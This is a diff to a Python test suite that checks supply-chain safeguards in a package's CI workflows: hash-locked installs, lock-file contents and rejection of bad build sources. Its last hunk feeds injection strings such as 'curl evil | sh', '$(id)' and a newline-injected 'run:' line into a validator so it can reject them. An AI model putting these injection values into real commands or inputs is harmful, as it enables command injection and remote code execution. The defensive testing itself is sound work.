@@ -636,7 +636,7 @@ def test_every_job_that_signs_or_sees_a_secret_installs_by_hash_and_nothing_unha
                 found[path.name, name] = _installs(job)
     # the test sees what it is meant to: the four jobs that sign, the relay and the canary (it holds a token), each with its one
     # hash-locked install
-    assert sorted(found) == sorted([*SIGNS, ("worker.yml", "relay"), ("knos-canary.yml", "canary")]), sorted(found)
+    assert sorted(found) == sorted([*SIGNS, ("worker.yml", "relay"), ("worker.yml", "event"), ("knos-canary.yml", "canary")]), sorted(found)
     assert all(len(lines) == 1 and "--require-hashes" in lines[0] for lines in found.values()), found
     # and it would catch the mistakes: no hashes, hashes without --no-deps or --no-build, an editable install, a tool install
     signing = {"permissions": {"id-token": "write"}, "jobs": {}}
@@ -1205,7 +1205,7 @@ def test_every_yaml_file_under_examples_is_read_by_the_tests_that_know_its_rules
     every = {p.relative_to(EXAMPLES).as_posix() for ext in ("*.yml", "*.yaml") for p in EXAMPLES.rglob(ext)}
     top = {p.name for p in EXAMPLES.glob("*.yml")}
     adapters = {p.relative_to(EXAMPLES).as_posix() for p in (EXAMPLES / "adapters").glob("*.yml")}
-    assert every == top | adapters | {"gitlab/.gitlab-ci.yml"}, sorted(every - top - adapters)
+    assert every == top | adapters | {"gitlab/.gitlab-ci.yml", "private/knos-private.yml"}, sorted(every - top - adapters)
     assert top <= {p.name for p in _files()} and top <= {p.name for p in _mine()}
     assert adapters and {EXAMPLES / a for a in adapters} <= set(_callers())
     listed = (ROOT / "tests" / "test_adapters.py").read_text(encoding="utf-8")
@@ -1455,7 +1455,7 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
     good = lock.read_text(encoding="utf-8")
     last = good.splitlines()[-1]
     for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
-                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.16 --hash=sha256:" + "a" * 64 + "\n"):
+                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.17 --hash=sha256:" + "a" * 64 + "\n"):
         bad = tmp_path / "bad.txt"
         bad.write_text(wrong, encoding="utf-8")
         with pytest.raises(SystemExit, match="the lock is not"):
@@ -1492,7 +1492,7 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
             pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
-    for bad in ('knos"; curl evil | sh; "', "knos==0.3.16 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
+    for bad in ('knos"; curl evil | sh; "', "knos==0.3.17 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
         with pytest.raises(SystemExit):
             pub.main(["build", str(tmp_path / "bad"), "--source", bad])
     assert not (tmp_path / "bad").exists()
